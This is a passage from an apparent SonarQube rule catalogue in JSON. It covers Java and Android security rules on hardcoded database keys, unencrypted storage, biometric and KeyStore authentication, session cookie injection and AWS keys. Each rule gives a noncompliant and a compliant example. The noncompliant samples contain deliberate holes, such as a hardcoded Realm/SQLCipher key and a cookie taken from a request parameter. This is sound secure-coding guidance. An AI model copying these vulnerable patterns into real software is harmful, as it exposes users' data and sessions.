href=\"https://refactoring.guru/design-patterns/visitor\">Refactoring Guru: Visitor</a> </li>\n  <li> <a href=\"https://openjdk.org/jeps/394\">JEP 394: Pattern Matching for <code>instanceof</code></a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.16\">JLS: Cast Expressions</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.20.2\">JLS: Type Comparison Operator <code>instanceof</code></a>\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6320","summary":"Cast operations should not trigger a ClassCastException","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>When storing local data in a mobile application, it is common to use a database that can be encrypted. When encryption of this database is enabled,\nthe encryption key must be protected properly.</p>\n<h2>Why is this an issue?</h2>\n<p>Mobile applications often need to store data (which might be sensitive) locally. For Android, there exist several libraries that simplify this\nprocess by offering a feature-rich database system. <a href=\"https://www.zetetic.net/sqlcipher/\">SQLCipher</a> and <a\nhref=\"https://realm.io/\">Realm</a> are examples of such libraries. These libraries often add support for database encryption, to protect the contents\nfrom being read by other apps or by attackers.</p>\n<p>When using encryption for such a database, it is important that the encryption key stays secret. If this key is hardcoded in the application, then\nit should be considered compromised. The key will be known by anyone with access to the applicationâs binary code or source code. This means that the\nsensitive encrypted data can be decrypted by anyone having access to the binary of the mobile application.</p>\n<p>Furthermore, if the key is hardcoded, it is the same for every user. A compromise of this encryption key implicates every user of the app.</p>\n<p>The encryption key is meant to stay secret and should not be hard-coded in the application as it would mean that:</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker is able to find the encryption key for the mobile database, this can potentially have severe consequences.</p>\n<h4>Theft of sensitive data</h4>\n<p>If a mobile database is encrypted, it is likely to contain data that is sensitive for the user or the app publisher. For example, it can contain\npersonally identifiable information (PII), financial data, login credentials, or other sensitive user data.</p>\n<p>By not protecting the encryption key properly, it becomes very easy for an attacker to recover it and then decrypt the mobile database. At that\npoint, the theft of sensitive data might lead to identity theft, financial fraud, and other forms of malicious activities.</p>\n<h2>How to fix it in Realm</h2>\n<h3>Code examples</h3>\n<p>In the example below, a local database is opened using a hardcoded key. To fix this, the key is moved to a secure location instead and retrieved\nusing a <code>getKey()</code> method.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"201\" data-diff-type=\"noncompliant\">\nString key = \"gb09ym9ydoolp3w886d0tciczj6ve9kszqd65u7d126040gwy86xqimjpuuc788g\";\nRealmConfiguration config = new RealmConfiguration.Builder();\n    .encryptionKey(key.toByteArray()) // Noncompliant\n    .build();\nRealm realm = Realm.getInstance(config);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"201\" data-diff-type=\"compliant\">\nRealmConfiguration config = new RealmConfiguration.Builder()\n    .encryptionKey(getKey())\n    .build();\nRealm realm = Realm.getInstance(config);\n</pre>\n<h3>How does this work?</h3>\n<h4>Using Androidâs builtin key storage options</h4>\n<p>The <a href=\"https://developer.android.com/privacy-and-security/keystore\">Android Keystore</a> system allows apps to store encryption keys in a\ncontainer that is protected on a system level. Additionally, it can restrict when and how the keys are used. For example, it allows the app to require\nuser authentication (for example using a fingerprint) before the key is made available. This is the recommended way to store cryptographic keys on\nAndroid.</p>\n<h4>Dynamically retrieving encryption keys remotely</h4>\n<p>As user devices are less trusted than controlled environments such as the application backend, the latter should be preferred for the storage of\nencryption keys. This requires that a userâs device has an internet connection, which may not be suitable for every use case.</p>\n<h3>Going the extra mile</h3>\n<h4>Avoid storing sensitive data on user devices</h4>\n<p>In general, it is always preferable to store as little sensitive data on user devices as possible.</p>\n<p>Of course, some sensitive data always has to be stored on client devices, such as the data required for authentication. In this case, consider\nwhether the application logic can also function with a hash (or otherwise non-reversible form) of that data. For example, if an email address is\nrequired for authentication, it might be possible to use and store a hashed version of this address instead.</p>\n<h2>How to fix it in SQLCipher</h2>\n<h3>Code examples</h3>\n<p>In the example below, a local database is opened using a hardcoded key. To fix this, the key is moved to a secure location instead and retrieved\nusing a <code>getKey()</code> method.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\nString key = \"gb09ym9ydoolp3w886d0tciczj6ve9kszqd65u7d126040gwy86xqimjpuuc788g\";\nSQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(\"test.db\", key, null); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\nSQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(\"test.db\", getKey(), null);\n</pre>\n<h3>How does this work?</h3>\n<h4>Using Androidâs builtin key storage options</h4>\n<p>The <a href=\"https://developer.android.com/privacy-and-security/keystore\">Android Keystore</a> system allows apps to store encryption keys in a\ncontainer that is protected on a system level. Additionally, it can restrict when and how the keys are used. For example, it allows the app to require\nuser authentication (for example using a fingerprint) before the key is made available. This is the recommended way to store cryptographic keys on\nAndroid.</p>\n<h4>Dynamically retrieving encryption keys remotely</h4>\n<p>As user devices are less trusted than controlled environments such as the application backend, the latter should be preferred for the storage of\nencryption keys. This requires that a userâs device has an internet connection, which may not be suitable for every use case.</p>\n<h3>Going the extra mile</h3>\n<h4>Avoid storing sensitive data on user devices</h4>\n<p>In general, it is always preferable to store as little sensitive data on user devices as possible.</p>\n<p>Of course, some sensitive data always has to be stored on client devices, such as the data required for authentication. In this case, consider\nwhether the application logic can also function with a hash (or otherwise non-reversible form) of that data. For example, if an email address is\nrequired for authentication, it might be possible to use and store a hashed version of this address instead.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Android Documentation - <a href=\"https://developer.android.com/privacy-and-security/keystore\">Android Keystore system</a> </li>\n  <li> Android Documentation - <a href=\"https://developer.android.com/privacy-and-security/security-tips#UserData\">Security tips - User data</a> </li>\n  <li> OWASP Mobile Application Security Testing Guide - <a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/\">Data Storage on Android</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-STORAGE/\">Mobile AppSec Verification Standard - Data Storage and Privacy\n  Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">Mobile Top 10 2016 Category M2 - Insecure\n  Data Storage</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m1-improper-credential-usage\">Mobile Top 10 2024 Category M1 - Improper\n  Credential Usage</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m9-insecure-data-storage\">Mobile Top 10 2024 Category M9 - Insecure\n  Data Storage</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m10-insufficient-cryptography\">Mobile Top 10 2024 Category M10 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/321\">CWE-321 - Use of Hard-coded Cryptographic Key</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6301","summary":"Mobile database encryption keys should not be disclosed","tags":["cwe","android"],"versions":{"serverEdition":"Developer","serverVersion":"9.2.4.50792","communityVersion":"9.2.4.50792"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Storing files locally is a common task for mobile applications. Files that are stored unencrypted can be read out and modified by an attacker with\nphysical access to the device. Access to sensitive data can be harmful for the user of the application, for example when the device gets stolen.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The file contains sensitive data that could cause harm when leaked. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Itâs recommended to password-encrypt local files that contain sensitive information. The class <a\nhref=\"https://developer.android.com/reference/androidx/security/crypto/EncryptedFile\">EncryptedFile</a> can be used to easily encrypt files.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nFiles.write(path, content); // Sensitive\n\nFileOutputStream out = new FileOutputStream(file); // Sensitive\n\nFileWriter fw = new FileWriter(\"outfilename\", false); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC);\n\nFile file = new File(context.getFilesDir(), \"secret_data\");\nEncryptedFile encryptedFile = EncryptedFile.Builder(\n    file,\n    context,\n    masterKeyAlias,\n    EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB\n).build();\n\n// write to the encrypted file\nFileOutputStream encryptedOutputStream = encryptedFile.openFileOutput();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-STORAGE/\">Mobile AppSec Verification Standard - Data Storage and Privacy\n  Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">Mobile Top 10 2016 Category M2 - Insecure\n  Data Storage</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m9-insecure-data-storage\">Mobile Top 10 2024 Category M9 - Insecure\n  Data Storage</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6300","summary":"Using unencrypted files in mobile applications is security-sensitive","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.2.4.50792","communityVersion":"9.2.4.50792"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>Android comes with Android KeyStore, a secure container for storing key materials. Itâs possible to define certain keys to be unlocked when users\nauthenticate using biometric credentials. This way, even if the application process is compromised, the attacker cannot access keys, as presence of\nthe authorized user is required.</p>\n<p>These keys can be used, to encrypt, sign or create a message authentication code (MAC) as proof that the authentication result has not been\ntampered with. This protection defeats the scenario where an attacker with physical access to the device would try to hook into the application\nprocess and call the <code>onAuthenticationSucceeded</code> method directly. Therefore he would be unable to extract the sensitive data or to perform\nthe critical operations protected by the biometric authentication.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The application contains:</p>\n<ul>\n  <li> Cryptographic keys / sensitive information that need to be protected using biometric authentication. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Itâs recommended to tie the biometric authentication to a cryptographic operation by using a <code>CryptoObject</code> during authentication.</p>\n<h2>Sensitive Code Example</h2>\n<p>A <code>CryptoObject</code> is not used during authentication:</p>\n<pre>\n// ...\nBiometricPrompt biometricPrompt = new BiometricPrompt(activity, executor, callback);\n// ...\nbiometricPrompt.authenticate(promptInfo); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<p>A <code>CryptoObject</code> is used during authentication:</p>\n<pre>\n// ...\nBiometricPrompt biometricPrompt = new BiometricPrompt(activity, executor, callback);\n// ...\nbiometricPrompt.authenticate(promptInfo, new BiometricPrompt.CryptoObject(cipher)); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication\">Mobile Top 10 2016 Category M4 - Insecure\n  Authentication</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m3-insecure-authentication-authorization\">Mobile Top 10 2024 Category\n  M3 - Insecure Authentication/Authorization</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-AUTH/\">Mobile AppSec Verification Standard - Authentication and Session Management\n  Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/287\">CWE-287 - Improper Authentication</a> </li>\n  <li> <a href=\"https://developer.android.com/training/sign-in/biometric-auth\">developer.android.com</a> - Use a cryptographic solution that depends\n  on authentication </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6293","summary":"Using biometric authentication without a cryptographic solution is security-sensitive","tags":["cwe","android"],"versions":{"serverEdition":"Developer","serverVersion":"9.2.4.50792","communityVersion":"9.2.4.50792"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Storing data locally is a common task for mobile applications. Such data includes preferences or authentication tokens for external services, among\nother things. There are many convenient solutions that allow storing data persistently, for example SQLiteDatabase, SharedPreferences, and Realm. By\ndefault these systems store the data unencrypted, thus an attacker with physical access to the device can read them out easily. Access to sensitive\ndata can be harmful for the user of the application, for example when the device gets stolen.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Itâs recommended to password-encrypt local databases that contain sensitive information. Most systems provide secure alternatives to plain-text\nstorage that should be used. If no secure alternative is available the data can also be encrypted manually before it is stored.</p>\n<p>The encryption password should not be hard-coded in the application. There are different approaches how the password can be provided to encrypt and\ndecrypt the database. In the case of <code>EncryptedSharedPreferences</code> the Android Keystore can be used to store the password. Other databases\ncan rely on <code>EncryptedSharedPreferences</code> to store passwords. The password can also be provided dynamically by the user of the application\nor it can be fetched from a remote server if the other methods are not feasible.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://developer.android.com/reference/kotlin/android/database/sqlite/SQLiteDatabase\">SQLiteDatabase</a>:</p>\n<pre>\nSQLiteDatabase db = activity.openOrCreateDatabase(\"test.db\", Context.MODE_PRIVATE, null); // Sensitive\n</pre>\n<p>For <a href=\"https://developer.android.com/training/data-storage/shared-preferences\">SharedPreferences</a>:</p>\n<pre>\nSharedPreferences pref = activity.getPreferences(Context.MODE_PRIVATE); // Sensitive\n</pre>\n<p>For <a href=\"https://docs.mongodb.com/realm/\">Realm</a>:</p>\n<pre>\nRealmConfiguration config = new RealmConfiguration.Builder().build();\nRealm realm = Realm.getInstance(config); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Instead of SQLiteDatabase you can use <a href=\"https://www.zetetic.net/sqlcipher/sqlcipher-for-android/\">SQLCipher</a>:</p>\n<pre>\nSQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(\"test.db\", getKey(), null);\n</pre>\n<p>Instead of SharedPreferences you can use <a\nhref=\"https://developer.android.com/reference/androidx/security/crypto/EncryptedSharedPreferences\">EncryptedSharedPreferences</a>:</p>\n<pre>\nString masterKeyAlias = new MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC);\nEncryptedSharedPreferences.create(\n    \"secret\",\n    masterKeyAlias,\n    context,\n    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,\n    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM\n);\n</pre>\n<p>For Realm an encryption key can be specified in the config:</p>\n<pre>\nRealmConfiguration config = new RealmConfiguration.Builder()\n    .encryptionKey(getKey())\n    .build();\nRealm realm = Realm.getInstance(config);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-STORAGE/\">Mobile AppSec Verification Standard</a> - Data Storage and Privacy\n  Requirements </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">Mobile Top 10 2016 Category M2 - Insecure\n  Data Storage</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m9-insecure-data-storage\">Mobile Top 10 2024 Category M9 - Insecure\n  Data Storage</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6291","summary":"Using unencrypted databases in mobile applications is security-sensitive","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.2.4.50792","communityVersion":"9.2.4.50792"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>Android KeyStore is a secure container for storing key materials, in particular it prevents key materials extraction, i.e. when the application\nprocess is compromised, the attacker cannot extract keys but may still be able to use them. Itâs possible to enable an Android security feature, user\nauthentication, to restrict usage of keys to only authenticated users. The lock screen has to be unlocked with defined credentials\n(pattern/PIN/password, biometric).</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application requires prohibiting the use of keys in case of compromise of the application process. </li>\n  <li> The key material is used in the context of a highly sensitive application like a e-banking mobile app. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Itâs recommended to enable user authentication (by setting <code>setUserAuthenticationRequired</code> to <code>true</code> during key generation)\nto use keys for a limited duration of time (by setting appropriate values to <code>setUserAuthenticationValidityDurationSeconds</code>), after which\nthe user must re-authenticate.</p>\n<h2>Sensitive Code Example</h2>\n<p>Any user can use the key:</p>\n<pre>\nKeyGenerator keyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\");\n\nKeyGenParameterSpec builder = new KeyGenParameterSpec.Builder(\"test_secret_key_noncompliant\", KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT) // Noncompliant\n    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)\n    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)\n    .build();\n\nkeyGenerator.init(builder);\n</pre>\n<h2>Compliant Solution</h2>\n<p>The use of the key is limited to authenticated users (for a duration of time defined to 60 seconds):</p>\n<pre>\nKeyGenerator keyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\");\n\nKeyGenParameterSpec builder = new KeyGenParameterSpec.Builder(\"test_secret_key\", KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)\n    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)\n    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)\n    .setUserAuthenticationRequired(true)\n    .setUserAuthenticationParameters (60, KeyProperties.AUTH_DEVICE_CREDENTIAL)\n    .build();\n\nkeyGenerator.init(builder)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-STORAGE/\">Mobile AppSec Verification Standard - Authentication and Session Management\n  Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication\">Mobile Top 10 2016 Category M4 - Insecure\n  Authentication</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m3-insecure-authentication-authorization\">Mobile Top 10 2024 Category\n  M3 - Insecure Authentication/Authorization</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m10-insufficient-cryptography\">Mobile Top 10 2024 Category M10 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/522\">CWE-522 - Insufficiently Protected Credentials</a> </li>\n  <li> <a href=\"https://developer.android.com/privacy-and-security/keystore\">developer.android.com</a> - Android keystore system </li>\n  <li> <a href=\"https://developer.android.com/privacy-and-security/keystore#UserAuthentication\">developer.android.com</a> - Require user\n  authentication for key use </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6288","summary":"Authorizing non-authenticated users to use keys in the Android KeyStore is security-sensitive","tags":["cwe","android"],"versions":{"serverEdition":"Developer","serverVersion":"9.2.4.50792","communityVersion":"9.2.4.50792"},"cleanCodeAttribute":"CONVENTIONAL","type":"Security Hotspot"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>\n<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the\napplication.</p>\n<p>The injection might occur via a GET parameter, and the payload, for example, <code><a\nhref=\"https://example.com?cookie=injectedcookie\">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a\nsession that isnât theirs.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Sensitive data disclosure</h4>\n<p>A victim introduces sensitive data within the attackerâs application session that can later be retrieved by them. This can lead to a variety of\nimplications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>\n<h4>Vulnerability chaining</h4>\n<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and\nexploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attackerâs session and is affected by the XSS,\nwhich can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>\n<h2>How to fix it in a Servlet</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n    Optional&lt;Cookie&gt; cookieOpt = Arrays.stream(request.getCookies())\n                                    .filter(c -&gt; c.getName().equals(\"jsessionid\"))\n                                    .findFirst();\n\n    if (!cookieOpt.isPresent()) {\n        String cookie = request.getParameter(\"cookie\");\n        Cookie cookieObj = new Cookie(\"jsessionid\", cookie);\n        response.addCookie(cookieObj);\n    }\n\n    response.sendRedirect(\"/welcome.jsp\");\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n    Optional&lt;Cookie&gt; cookieOpt = Arrays.stream(request.getCookies())\n                                    .filter(c -&gt; c.getName().equals(\"jsessionid\"))\n                                    .findFirst();\n\n    if (!cookieOpt.isPresent()) {\n        response.sendRedirect(\"/getCookie.jsp\");\n    } else {\n        response.sendRedirect(\"/welcome.jsp\");\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the\nvalue of a session cookie to untrusted data.</p>\n<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade\ntools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to\nuse these solutions than to develop your own.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/384\">CWE-384 - Session Fixation</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222582\">Application Security and\n  Development: V-222582</a> - The application must not re-use or recycle session IDs. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6287","summary":"Applications should not create session cookies from untrusted input","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.2.4.50792","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>In AWS, long-term access keys will be valid until you manually revoke them. This makes them highly sensitive as any exposure can have serious\nconsequences and should be used with care.</p>\n<p>This rule will trigger when encountering an instantiation of <code>com.amazonaws.auth.BasicAWSCredentials</code>.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The access key is used directly in an application or AWS CLI script running on an Amazon EC2 instance. </li>\n  <li> Cross-account access is needed. </li>\n  <li> The access keys need to be embedded within a mobile application. </li>\n  <li> Existing identity providers (SAML 2.0, on-premises identity store) already exists. </li>\n</ul>\n<p>For more information, see <a href=\"https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html#use-roles\">Use IAM roles\ninstead of long-term access keys</a>.</p>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Consider using IAM roles or other features of the AWS Security Token Service that provide temporary credentials, limiting the risks.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport com.amazonaws.auth.AWSCredentials;\nimport com.amazonaws.auth.BasicAWSCredentials;\n// ...\n\nAWSCredentials awsCredentials = new BasicAWSCredentials(accessKeyId, secretAccessKey);\n</pre>\n<h2>Compliant Solution</h2>\n<p>Example for AWS STS (see <a href=\"https://docs.aws.amazon.com/sdk-for-java/v1/developer-guide/prog-services-sts.html\">Getting Temporary Credentials\nwith AWS STS</a>).</p>\n<pre>\nBasicSessionCredentials sessionCredentials = new BasicSessionCredentials(\n   session_creds.getAccessKeyId(),\n   session_creds.getSecretAccessKey(),\n   session_creds.getSessionToken());\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html\">Best practices for managing AWS access keys</a>\n  </li>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html\">Managing access keys for IAM users</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6263","summary":"Using long-term access keys is security-sensitive","tags":["aws"],"versions":{"serverEdition":"Developer","serverVersion":"9.6.1.59531","communityVersion":"9.6.1.59531"},"cleanCodeAttribute":"COMPLETE","type":"Security 